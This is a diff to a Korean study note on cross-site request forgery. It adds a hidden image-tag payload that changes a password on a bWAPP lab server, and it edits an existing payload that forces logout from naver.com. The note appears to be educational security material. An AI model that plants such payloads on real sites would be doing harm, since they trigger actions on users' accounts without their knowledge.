@@ -24,11 +24,15 @@ CSRF의 공격이 수행되기 위해서는 몇가지의 조건이 필요하다.
 
 ## 🚩 Offensive techniques
 
+비밀번호 변경
 
+```js
+<img src="http://192.168.200.85/bWAPP/csrf_1.php?password_new=1234&password_conf=1234&action=change" height="0" width="0">
+```
 
 ```js
 접속 시 로그아웃 시키기
-<img src="https://www.naver.com/logout" width="1", height="1">
+<img src="https://www.naver.com/logout" width="1" height="1">
 ```
 
 ```js
